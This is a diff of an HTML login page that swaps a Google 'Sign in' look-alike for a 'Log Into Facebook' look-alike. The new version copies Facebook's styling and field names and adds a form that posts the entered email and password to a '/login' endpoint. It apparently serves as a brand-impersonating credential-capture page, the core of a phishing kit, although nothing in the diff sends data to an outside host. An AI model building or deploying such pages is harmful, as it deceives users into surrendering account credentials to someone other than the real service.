@@ -3,271 +3,164 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google</title>
+    <title>Log Into Facebook</title>
     <style>
         * {
-            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: 'Roboto', Arial, sans-serif;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
         }
-        
+
         body {
-            background-color: #fff;
+            background-color: #f0f2f5;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            flex-direction: column;
         }
-        
-        .login-container {
-            width: 450px;
-            padding: 48px 40px 36px;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
+
+        .logo {
+            color: #1877f2;
+            font-size: 60px;
+            font-weight: bold;
+            margin-bottom: 20px;
             text-align: center;
         }
-        
-        .google-logo {
-            margin-bottom: 16px;
-            height: 24px;
+
+        .login-container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 396px;
+            max-width: 100%;
         }
-        
-        h1 {
-            font-size: 24px;
-            font-weight: 400;
-            color: #202124;
-            margin-bottom: 8px;
+
+        .title {
+            font-size: 18px;
+            font-weight: normal;
+            margin-bottom: 20px;
+            text-align: center;
+            color: #1c1e21;
         }
-        
-        .subtitle {
-            font-size: 16px;
-            font-weight: 400;
-            color: #202124;
-            margin-bottom: 32px;
-        }
-        
-        .form-container {
-            text-align: left;
-        }
-        
-        .input-container {
-            position: relative;
-            margin-bottom: 24px;
-        }
-        
-        .input-field {
+
+        input[type="text"],
+        input[type="password"] {
             width: 100%;
-            height: 56px;
-            padding: 13px 15px;
-            font-size: 16px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
+            padding: 14px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #1877f2;
             outline: none;
         }
-        
-        .input-field:focus {
-            border: 2px solid #1a73e8;
+
+        .login-button {
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 12px;
+            width: 100%;
+            cursor: pointer;
+            margin-bottom: 16px;
         }
-        
-        .show-password {
+
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+
+        .links {
+            display: flex;
+            justify-content: center;
+            margin-top: 16px;
+        }
+
+        .links a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            margin: 0 5px;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .separator {
+            color: #96999e;
+            margin: 0 5px;
+        }
+
+        .password-container {
+            position: relative;
+            margin-bottom: 12px;
+        }
+
+        .password-toggle {
             position: absolute;
-            right: 12px;
+            right: 10px;
             top: 50%;
             transform: translateY(-50%);
-            background: none;
-            border: none;
-            color: #5f6368;
             cursor: pointer;
-            outline: none;
-        }
-        
-        .show-password:focus {
-            outline: none;
-        }
-        
-        .show-password svg {
-            fill: #5f6368;
-        }
-        
-        .links-container {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 32px;
-        }
-        
-        .forgot-link {
-            color: #1a73e8;
-            font-weight: 500;
-            text-decoration: none;
-            font-size: 14px;
-        }
-        
-        .help-text {
-            font-size: 14px;
-            color: #5f6368;
-            margin-bottom: 32px;
-        }
-        
-        .help-text a {
-            color: #1a73e8;
-            text-decoration: none;
-            font-weight: 500;
-        }
-        
-        .action-buttons {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .create-account {
-            color: #1a73e8;
-            font-weight: 500;
-            font-size: 14px;
-            text-decoration: none;
-        }
-        
-        .next-button {
-            background-color: #1a73e8;
-            color: white;
-            padding: 10px 24px;
+            width: 24px;
+            height: 24px;
+            background-color: transparent;
             border: none;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-        }
-        
-        .next-button:hover {
-            background-color: #1665d8;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
-        }
-        
-        .footer {
-            margin-top: 80px;
-            display: flex;
-            justify-content: space-between;
-            font-size: 12px;
-            color: #5f6368;
-        }
-        
-        .footer select {
-            background: none;
-            border: none;
-            color: #5f6368;
-            font-size: 12px;
-        }
-        
-        .footer-links a {
-            color: #5f6368;
-            text-decoration: none;
-            margin-left: 24px;
-        }
-        
-        .checkbox-container {
             display: flex;
             align-items: center;
-            margin-bottom: 24px;
+            justify-content: center;
         }
-        
-        .checkbox-container input {
-            margin-right: 10px;
-        }
-        
-        .checkbox-label {
-            font-size: 14px;
-            color: #202124;
+
+        .eye-icon {
+            width: 22px;
+            height: 22px;
+            fill: #606770;
         }
     </style>
 </head>
 <body>
+    <div class="logo">facebook</div>
+
     <div class="login-container">
-        <svg class="google-logo" viewBox="0 0 272 92" width="75" height="24">
-          <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
-          <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
-          <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
-          <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
-          <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
-          <path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/>
-        </svg>
-        <h1>Sign in</h1>
-        <p class="subtitle">Use your Google Account</p>
-        
-        <div class="form-container">
-            <div class="input-container">
-                <input type="email" class="input-field" placeholder="Email or phone" required>
-            </div>
-            
-            <div class="input-container">
-                <input type="password" id="password" class="input-field" placeholder="Password" required>
-                <button id="togglePassword" class="show-password" aria-label="Toggle password visibility">
-                    <!-- Show password icon (eye) -->
-                    <svg id="visibilityIcon" height="24px" viewBox="0 0 24 24" width="24px" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M12,9c1.642,0,3,1.359,3,3c0,1.642-1.358,3-3,3c-1.641,0-3-1.358-3-3C9,10.359,10.359,9,12,9z"/>
-                        <path d="M12,5c-7.569,0-12,6.5-12,6.5S4.431,18,12,18s12-6.5,12-6.5S19.569,5,12,5z M12,16c-2.500,0-4.5-2.015-4.5-4.5 S9.500,7,12,7c2.500,0,4.5,2.015,4.5,4.5S14.500,16,12,16z"/>
-                    </svg>
-                    <!-- Hide password icon (eye with slash) - initially hidden -->
-                    <svg id="visibilityOffIcon" style="display: none;" height="24px" viewBox="0 0 24 24" width="24px" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M12,7c2.76,0,5,2.24,5,5c0,0.65-0.13,1.26-0.36,1.83l2.92,2.92c1.51-1.26,2.7-2.89,3.43-4.75 c-1.73-4.39-6-7.5-11-7.5c-1.4,0-2.74,0.25-3.98,0.7l2.16,2.16C10.74,7.13,11.35,7,12,7z"/>
-                        <path d="M2,4.27l2.28,2.28l0.46,0.46C3.08,8.3,1.78,10.02,1,12c1.73,4.39,6,7.5,11,7.5c1.55,0,3.03-0.3,4.38-0.84l0.42,0.42 L19.73,22L21,20.73L3.27,3L2,4.27z M7.53,9.8l1.55,1.55c-0.05,0.21-0.08,0.43-0.08,0.65c0,1.66,1.34,3,3,3c0.22,0,0.44-0.03,0.65-0.08 l1.55,1.55c-0.67,0.33-1.41,0.53-2.2,0.53c-2.76,0-5-2.24-5-5C7,11.21,7.2,10.47,7.53,9.8z M11.84,9.02l3.15,3.15l0.02-0.16 c0-1.66-1.34-3-3-3L11.84,9.02z"/>
+        <div class="title">Log Into Facebook</div>
+
+        <form action="/login" method="POST">
+            <input type="text" name="email" placeholder="Email or phone number" required>
+
+            <div class="password-container">
+                <input type="password" id="password" name="pass" placeholder="Password" required>
+                <button type="button" class="password-toggle" onclick="togglePassword()">
+                    <svg class="eye-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                     </svg>
                 </button>
             </div>
-            
-            <div class="links-container">
-                <a href="#" class="forgot-link">Forgot email?</a>
-                <a href="#" class="forgot-link">Forgot password?</a>
-            </div>
-            
-            <div class="checkbox-container">
-                <input type="checkbox" id="stay-signed-in">
-                <label for="stay-signed-in" class="checkbox-label">Stay signed in</label>
-            </div>
-            
-            <p class="help-text">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
-            
-            <div class="action-buttons">
-                <a href="#" class="create-account">Create account</a>
-                <button class="next-button">Sign in</button>
-            </div>
-        </div>
-        
-        <div class="footer">
-            <select>
-                <option>English (United States)</option>
-            </select>
-            <div class="footer-links">
-                <a href="#">Help</a>
-                <a href="#">Privacy</a>
-                <a href="#">Terms</a>
-            </div>
+
+            <button type="submit" class="login-button">Log In</button>
+        </form>
+
+        <div class="links">
+            <a href="#">Forgot account?</a>
+            <span class="separator">·</span>
+            <a href="#">Sign up for Facebook</a>
         </div>
     </div>
-    
+
     <script>
-        // Get references to the elements
-        const passwordInput = document.getElementById('password');
-        const toggleButton = document.getElementById('togglePassword');
-        const visibilityIcon = document.getElementById('visibilityIcon');
-        const visibilityOffIcon = document.getElementById('visibilityOffIcon');
-        
-        // Add click event to toggle password visibility
-        toggleButton.addEventListener('click', function() {
-            // Toggle the password field type between password and text
-            if (passwordInput.type === 'password') {
-                passwordInput.type = 'text';
-                visibilityIcon.style.display = 'none';
-                visibilityOffIcon.style.display = 'block';
-            } else {
-                passwordInput.type = 'password';
-                visibilityIcon.style.display = 'block';
-                visibilityOffIcon.style.display = 'none';
-            }
-            
-            // Focus back on the password input field
-            passwordInput.focus();
-        });
+        function togglePassword() {
+            const passwordInput = document.getElementById("password");
+            passwordInput.type = passwordInput.type === "password" ? "text" : "password";
+        }
     </script>
 </body>
 </html>
